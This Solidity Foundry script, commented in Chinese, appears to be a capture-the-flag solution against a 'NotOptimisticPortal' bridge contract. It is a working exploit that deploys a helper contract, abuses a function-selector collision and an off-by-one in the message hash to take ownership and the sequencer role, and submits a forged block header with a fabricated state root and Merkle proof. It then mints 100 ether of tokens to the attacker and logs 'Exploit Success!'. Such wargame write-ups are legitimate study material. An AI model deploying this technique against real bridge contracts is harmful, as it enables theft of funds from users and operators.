// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

// ==========================================
// 1. Interface 定义
// ==========================================
interface INotOptimisticPortal {
    struct ProofData {
        bytes stateTrieProof;
        bytes storageTrieProof;
        bytes accountStateRlp;
    }

    function executeMessage(
        address _tokenReceiver,
        uint256 _amount,
        address[] calldata _messageReceivers,
        bytes[] calldata _messageData,
        uint256 _salt,
        ProofData calldata _proofs,
        uint16 _bufferIndex
    ) external;

    // Selector: 0x3a69197e
    function updateSequencer_____76439298743(address newSequencer) external;
    // Selector: 0x3a69197e
    function submitNewBlock_____37278985983(bytes memory rlpBlockHeader) external;

    // Views
    function latestBlockHash() external view returns (bytes32);
    function latestBlockNumber() external view returns (uint256);
    function latestBlockTimestamp() external view returns (uint256);
    function bufferCounter() external view returns (uint16);
    function balanceOf(address who) external view returns (uint256);
}

// ==========================================
// 2. 攻击辅助合约 (接收回调並修改 Portal 状态)
// ==========================================
contract AttackReceiver {
    INotOptimisticPortal public immutable portal;

    constructor(address portal_) {
        portal = INotOptimisticPortal(portal_);
    }

    // Selector: 0x3a69197e
    // 这个函数会在 Portal 验证 proof 之前被调用
    function onMessageReceived(bytes memory rlpBlockHeader) external {
        // 此时 Portal 的 Owner 已经被上一步操作改成了这个合约
        portal.updateSequencer_____76439298743(address(this));

        // 此时 Sequencer 已经是这个合约，可以提交新的 State Root
        portal.submitNewBlock_____37278985983(rlpBlockHeader);
    }
}

// ==========================================
// 3. RLP 编码库 (用于构建 Block Header)
// ==========================================
library RLPWriter {
    function writeUint(uint256 v) internal pure returns (bytes memory) {
        if (v == 0) return hex"80";
        return writeBytes(_toBinary(v));
    }

    function writeBytes(bytes memory data) internal pure returns (bytes memory) {
        uint256 len = data.length;
        if (len == 1 && uint8(data[0]) < 0x80) return data;
        if (len <= 55) return bytes.concat(bytes1(uint8(0x80 + len)), data);
        bytes memory lenBytes = _toBinary(len);
        return bytes.concat(bytes1(uint8(0xb7 + lenBytes.length)), lenBytes, data);
    }

    function writeList(bytes[] memory items) internal pure returns (bytes memory) {
        bytes memory payload;
        for (uint256 i = 0; i < items.length; i++) payload = bytes.concat(payload, items[i]);
        uint256 len = payload.length;
        if (len <= 55) return bytes.concat(bytes1(uint8(0xc0 + len)), payload);
        bytes memory lenBytes = _toBinary(len);
        return bytes.concat(bytes1(uint8(0xf7 + lenBytes.length)), lenBytes, payload);
    }

    function _toBinary(uint256 x) private pure returns (bytes memory) {
        uint256 n = x;
        uint256 len;
        while (n != 0) { len++; n >>= 8; }
        bytes memory out = new bytes(len);
        for (uint256 i = 0; i < len; i++) {
            out[len - 1 - i] = bytes1(uint8(x));
            x >>= 8;
        }
        return out;
    }
}

// ==========================================
// 4. 主脚本逻辑
// ==========================================
contract ExploitScript is Script {
    address constant L2_TARGET = 0x4242424242424242424242424242424242424242;
    // 这是一个神奇的 Selector，在这个合约中发生了严重的 Collision
    // transferOwnership(address) == 0x3a69197e
    // onMessageReceived(bytes)   == 0x3a69197e
    bytes4 constant MAGIC_SELECTOR = 0x3a69197e;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);
        address portalAddr = vm.envAddress("INSTANCE_ADDRESS");

        INotOptimisticPortal portal = INotOptimisticPortal(portalAddr);

        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署辅助合约
        AttackReceiver attacker = new AttackReceiver(portalAddr);

        // 2. 准备 Mint 参数
        uint256 amountToMint = 100 ether; 
        uint256 salt = 0;
        
        // 关键点：Portal 计算 Hash 时少算最后一个元素 (Off-by-one bug)
        // 所以我们构建长度为 2 的数组，第 2 个元素放我们的 Block Header，它不会进入 Hash 计算
        address[] memory receivers = new address[](2);
        bytes[] memory datas = new bytes[](2);

        // Operation [0]: 让 Portal 自己调用自己，利用 Selector Collision 把 Owner 改成 attacker
        // target: Portal (msg.sender 将变成 Portal 自己，绕过 onlyOwner)
        // payload: MAGIC_SELECTOR + address(attacker) -> 解析为 transferOwnership(attacker)
        receivers[0] = portalAddr;
        datas[0] = abi.encodeWithSelector(MAGIC_SELECTOR, address(attacker));

        // Operation [1]: 利用 AttackReceiver 回调 Portal 提交伪造的 Block (含 State Root)
        // target: Attacker
        // payload: MAGIC_SELECTOR + rlpHeader -> 解析为 onMessageReceived(bytes)
        receivers[1] = address(attacker);
        datas[1] = hex""; // 先留空，用于计算 withdrawalHash (因为逻辑是忽略最后一个，所以这里的空不影响 hash)

        // 3. 计算 Withdrawal Hash (Message Slot)
        bytes32 messageSlot = _computeMessageSlot(deployer, amountToMint, receivers, datas, salt);

        // 4. 构建 Merkle Proof (证明 messageSlot 在 L2_TARGET 的 storage 中为 1)
        (bytes32 forgedStateRoot, INotOptimisticPortal.ProofData memory proofs) = _buildProof(messageSlot);

        // 5. 构建包含伪造 State Root 的 Block Header
        bytes memory forgedHeader = _buildRlpHeader(portal, forgedStateRoot);

        // 6. 填入真正的 Payload (这不会改变 messageSlot，因为 computeMessageSlot 忽略最后一个元素)
        datas[1] = abi.encodeWithSelector(MAGIC_SELECTOR, forgedHeader);

        uint16 bufferIndex = portal.bufferCounter();

        console2.log("Exploiting...");
        console2.log("Target Message Slot:", vm.toString(messageSlot));
        console2.log("Forged State Root:  ", vm.toString(forgedStateRoot));
        console2.log("Balance Before:     ", portal.balanceOf(deployer));

        // 7. 发送交易
        portal.executeMessage(
            deployer,
            amountToMint,
            receivers,
            datas,
            salt,
            proofs,
            bufferIndex
        );

        console2.log("Balance After:      ", portal.balanceOf(deployer));
        console2.log("Exploit Success!");

        vm.stopBroadcast();
    }

    // 复制 Portal 中的 Hash 逻辑 (包含 Bug)
    function _computeMessageSlot(
        address _tokenReceiver,
        uint256 _amount,
        address[] memory _messageReceivers,
        bytes[] memory _messageDatas,
        uint256 _salt
    ) internal pure returns (bytes32) {
        bytes32 rAccHash;
        bytes32 dAccHash;
        
        // BUG: < length - 1, 忽略了最后一个元素
        if (_messageReceivers.length != 0) {
            for (uint256 i = 0; i < _messageReceivers.length - 1; i++) {
                rAccHash = keccak256(abi.encode(rAccHash, _messageReceivers[i]));
                dAccHash = keccak256(abi.encode(dAccHash, _messageDatas[i]));
            }
        }
        return keccak256(abi.encode(_tokenReceiver, _amount, rAccHash, dAccHash, _salt));
    }

    // 构建最小的 Proof
    function _buildProof(bytes32 messageSlot) internal pure returns (bytes32, INotOptimisticPortal.ProofData memory) {
        // --- Storage Trie (Leaf 只有以太坊标准的 integer 1) ---
        // Secure Trie Key = keccak256(slot)
        bytes32 storageKey = keccak256(abi.encodePacked(messageSlot));
        
        // Leaf Node: [PathPrefix (0x20) + Key, Value (0x01)]
        // prefix 0x20: even nibbles, leaf node
        bytes memory storageLeaf = abi.encodePacked(hex"e3a120", storageKey, hex"01"); 
        bytes32 storageRoot = keccak256(storageLeaf);

        // --- Account State ---
        // RLP([nonce, balance, storageRoot, codeHash])
        // 取简略版由 Portal 读取: [0, 0, storageRoot]
        bytes memory accountStateRlp = abi.encodePacked(hex"e38080a0", storageRoot);

        // --- State Trie (Leaf 存 Account State) ---
        bytes32 accountKey = keccak256(abi.encodePacked(L2_TARGET));
        
        // Leaf Node: [PathPrefix (0x20) + Key, Value (AccountStateRLP)]
        // Length of AccountStateRLP is 36 (0x24) bytes -> RLP string prefix is 0xa4
        bytes memory stateLeaf = abi.encodePacked(hex"f847a120", accountKey, hex"a4", accountStateRlp);
        bytes32 stateRoot = keccak256(stateLeaf);

        // --- Proofs (RLP List of Nodes) ---
        // 因为我们只造了一个 Leaf Node，所以 Proof 就是包含这个 Leaf 的 List
        bytes memory storageProof = abi.encodePacked(hex"e5a4", storageLeaf); // List wrapping bytes
        bytes memory stateProof = abi.encodePacked(hex"f84bb849", stateLeaf); // List wrapping bytes (long)

        return (
            stateRoot,
            INotOptimisticPortal.ProofData({
                stateTrieProof: stateProof,
                storageTrieProof: storageProof,
                accountStateRlp: accountStateRlp
            })
        );
    }

    // 构建包含伪造 Root 的 Block Header
    function _buildRlpHeader(INotOptimisticPortal portal, bytes32 newStateRoot) internal view returns (bytes memory) {
        bytes32 parentHash = portal.latestBlockHash();
        uint256 number = portal.latestBlockNumber() + 1;
        uint256 timestamp = portal.latestBlockTimestamp() + 1;

        // 根据 Ethereum Block Header 结构构建 List
        // 我们只关心 Portal 校验的字段: [0]ParentHash, [3]StateRoot, [8]Number, [11]Timestamp
        bytes[] memory list = new bytes[](12);
        list[0] = RLPWriter.writeUint(uint256(parentHash));
        list[1] = RLPWriter.writeBytes(hex""); // ommersHash
        list[2] = RLPWriter.writeBytes(hex""); // beneficiary
        list[3] = RLPWriter.writeUint(uint256(newStateRoot)); // STATE ROOT
        list[4] = RLPWriter.writeBytes(hex""); // transactionsRoot
        list[5] = RLPWriter.writeBytes(hex""); // receiptsRoot
        list[6] = RLPWriter.writeBytes(hex""); // logsBloom
        list[7] = RLPWriter.writeBytes(hex""); // difficulty
        list[8] = RLPWriter.writeUint(number); // NUMBER
        list[9] = RLPWriter.writeBytes(hex""); // gasLimit
        list[10] = RLPWriter.writeBytes(hex""); // gasUsed
        list[11] = RLPWriter.writeUint(timestamp); // TIMESTAMP

        return RLPWriter.writeList(list);
    }
}
